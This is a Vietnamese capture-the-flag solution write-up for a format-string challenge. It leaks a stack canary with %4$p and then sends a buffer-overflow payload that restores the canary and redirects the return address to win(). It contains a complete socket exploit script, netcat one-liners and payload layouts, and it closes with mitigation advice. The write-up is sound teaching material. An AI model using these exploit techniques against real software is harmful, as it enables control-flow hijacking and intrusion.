# Thử thách 25: FmtString — Giải pháp

## Loại lỗ hổng
**Format String Vulnerability (Lỗ hổng chuỗi định dạng) + Stack Canary Bypass (Khai thác 2 giai đoạn)**

## Mô tả
Thử thách này mô phỏng một chương trình C sử dụng lệnh in vô tội vạ `printf(user_input)` — gây ra lỗi chuỗi định dạng Format String kinh điển. Để tăng độ khó, Stack được bảo vệ bởi một Canary (một chuỗi giá trị 8-byte sinh ngẫu nhiên, kết thúc bằng byte null `0x00`) nhằm bảo vệ Return Address không bị ghi đè. Do đó, việc khai thác bắt buộc phải trải qua 2 giai đoạn:

1. **Giai đoạn 1** — Dùng lỗi Format String để ép chương trình *rò rỉ (leak)* giá trị Canary nằm trên Stack.
2. **Giai đoạn 2** — Nã một Payload tràn bộ đệm Buffer Overflow chèn đúng giá trị Canary vừa bắt được vào lại vị trí cũ, nhằm qua mặt cơ chế kiểm tra (bypass) rồi mới ghi đè Return Address trỏ về hàm `win()`.

## Mã nguồn chứa lỗ hổng

```python
# chall.py — Mô phỏng printf(user_input)
fmt   = input("[fmt]> ").strip()
result = simulate_printf(fmt, stack)
print(f"[printf]: {result}")
```

Mã C tương đương trong thực tế:

```c
char buf[32];
// ... lấy input ...
printf(buf);       // VULNERABLE — Kẻ tấn công kiểm soát được chuỗi định dạng
```

## Bố cục ngăn xếp (Stack Layout)

```text
Index (Dùng cho toán tử %N$p)   Content (Nội dung)
─────────────────────────────────────────────
  %1$p   →   0x4141414141414141   (Biến nội bộ A)
  %2$p   →   0x00007fff5fbff260   (Biến nội bộ B / con trỏ pointer)
  %3$p   →   0x0000000000000000   (Biến nội bộ C)
  %4$p   →   <CANARY>             ← Đây chính là thứ chúng ta cần!
  %5$p   →   0x00007fff5fbff120   (Saved RBP)
  %6$p   →   0x000000000040128a   (Return addr thực tế ban đầu)
  %7$p   →   0x0000000000000001
  %8$p   →   0x0000000000000000
```

*Ghi chú về Canary:* Byte cuối (Least Significant Byte) luôn mang giá trị `0x00` (mục đích là để chặt đứt các chuỗi C-string, làm khó kỹ thuật leak bằng `%s`).

## Các bước khai thác (Exploit)

### Giai đoạn 1 - Ép rò rỉ Canary (Leak Canary)

Sử dụng cờ định dạng lấy theo vị trí chỉ định **`%4$p`** để ép lệnh printf đọc tham số thứ 4 trên Stack (chính là Canary):

```text
[fmt]> %4$p
[printf]: 0x1234567890abcd00
```

Giá trị rò rỉ chính là Canary. Để ý byte cuối cùng luôn là `00`.

### Giai đoạn 2 - Xây dựng tải trọng tràn bộ đệm (Overflow Payload)

Bố cục của Buffer trước lệnh copy `strcpy()`:
```text
offset 0x00 : [ buffer          32 bytes ]  ← Lấp đầy 32 ký tự 'A' (0x41)
offset 0x20 : [ stack canary     8 bytes ]  ← Nhồi lại Canary vừa leak (Định dạng little-endian!)
offset 0x28 : [ saved RBP        8 bytes ]  ← Ghi đè rác (ví dụ: 0x4242424242424242)
offset 0x30 : [ return address   8 bytes ]  ← Ép về trỏ tới 0x401337 (WIN_ADDR dạng little-endian)
```

**Địa chỉ hàm win():** `0x401337`  
**Dạng Little-endian:** `37 13 40 00 00 00 00 00`

```python
import struct

# Giả sử canary vừa leak được là = 0x1234567890abcd00
canary = 0x1234567890abcd00

payload  = b"A" * 32                          # Lấp đầy buffer 32 bytes
payload += struct.pack("<Q", canary)          # Đặt lại y hệt canary để lừa cơ chế check
payload += b"B" * 8                           # Ghi đè Saved RBP bằng rác
payload += struct.pack("<Q", 0x401337)        # Đè Return address nhảy về hàm win()

print(payload.hex())
```

## Khai thác tự động bằng Script

```python
import socket
import struct
import re

HOST = "<host>"
PORT = 1337
WIN_ADDR = 0x401337

def recv_until(sock, marker):
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data

with socket.create_connection((HOST, PORT)) as s:
    banner = recv_until(s, b"[fmt]>")
    print(banner.decode())

    # ── STAGE 1: Ép rò rỉ Canary ──────────────────────────────────────
    s.sendall(b"%4$p\n")
    response = recv_until(s, b"[payload]>")
    print(response.decode())

    match = re.search(r"\[printf\]: (0x[0-9a-f]+)", response.decode())
    canary = int(match.group(1), 16)
    print(f"[+] Canary thu thập được: {hex(canary)}")

    # ── STAGE 2: Xả tải trọng tràn bộ đệm có chứa Canary hợp lệ ─────────────────────
    payload  = b"A" * 32                        # buffer
    payload += struct.pack("<Q", canary)        # Chèn chuẩn canary
    payload += b"B" * 8                         # Lấp đầy saved RBP
    payload += struct.pack("<Q", WIN_ADDR)      # Điều khiển return address

    print(f"[*] Payload ({len(payload)}B): {payload.hex()}")
    s.sendall(payload.hex().encode() + b"\n")

    final = s.recv(4096).decode()
    print(final)

    flag = re.search(r"FCTF\{[^}]+\}", final)
    if flag:
        print(f"[+] Flag: {flag.group()}")
```

### Test thủ công qua Console (Manual)

```bash
# Stage 1: Lấy Canary
echo "%4\$p" | nc <host> 1337

# Stage 2: Nhúng Canary vào Payload Hex
python3 -c "
import struct
canary  = 0x<CANARY_VỪA_LEAK>
payload = b'A'*32 + struct.pack('<Q', canary) + b'B'*8 + struct.pack('<Q', 0x401337)
print(payload.hex())
" | nc <host> 1337
```

## Giải thích toàn cảnh cuộc Tấn công (Walkthrough)

```text
1. Kết nối vào Server → Máy chủ in ra địa chỉ hàm win(): 0x401337

2. Nhập dữ liệu Stage 1: %4$p
   Server đáp: [printf]: 0x5e1a2b3c4d5e0000
   → Suy ra Canary là = 0x5e1a2b3c4d5e0000

3. Tạo Payload Stage 2 (Chuỗi Hex):
   41414141414141414141414141414141  (16 byte 'A')
   41414141414141414141414141414141  (16 byte 'A')  → Đầy 32 byte buffer
   005e5e4d3c2b1a5e                  ← Canary viết xuôi theo Little-Endian (0x5e1a2b3c4d5e0000)
   4242424242424242                  ← Saved RBP rác
   3713400000000000                  ← Địa chỉ hàm win() theo Little-Endian (0x401337)

4. Phản hồi Server:
   [+] Canary OK: 0x5e1a2b3c4d5e0000
   [i] Return address: 0x401337
   [!] Jumping to win()!
   [*] FLAG: FCTF{...}
```

## Chức năng của Canary là gì?

Stack Canary (hay Stack Cookie) là một giá trị kiểm tra được hệ điều hành chèn vào ngăn xếp nằm ngay giữa **Local Buffer** và **Return Address**. Khi Buffer bị tràn, hacker muốn chạm tay tới mảng Return Address thì **bắt buộc** phải chà đạp qua Canary. Trước khi kết thúc hàm (vào lệnh `ret`), hệ thống sẽ check lại giá trị Canary này. Nếu nó bị lệch đi (thay đổi giá trị), chương trình sẽ phát báo động phát hiện tràn bộ đệm (stack smashing detected) và chết ngay lập tức (abort).

```text
Nếu không có lỗ hổng Format String: Hacker không biết Canary là gì → Đập tràn mù sẽ gây thay đổi Canary → Chương trình phát hiện và tự sát.
Nếu có lỗ hổng Format String:       Hacker leak được Canary → Lưu trữ nó và ghép vào lại Payload nguyên si → Bypass hoàn hảo lớp bảo vệ Canary.
```

## Biện pháp phòng ngừa (Mitigation)

```c
// 1. Luôn sử dụng %s cố định thay vì ném user_input thẳng vào tham số format
printf("%s", user_input);    // An toàn tuyệt đối
printf(user_input);          // Lỗi kinh hoàng, ĐỪNG BAO GIỜ làm thế này!

// 2. Ép trình biên dịch kích hoạt cơ chế Stack Canary bảo vệ
// gcc -fstack-protector-strong -fstack-protector-all

// 3. Tăng cường kiểm tra kích thước với cờ FORTIFY_SOURCE
// gcc -D_FORTIFY_SOURCE=2

// 4. Kích hoạt toàn bộ giáp bảo vệ hiện đại (RELRO, PIE, NX)
// gcc -Wl,-z,relro -Wl,-z,now -fpie -pie -fno-execstack
```
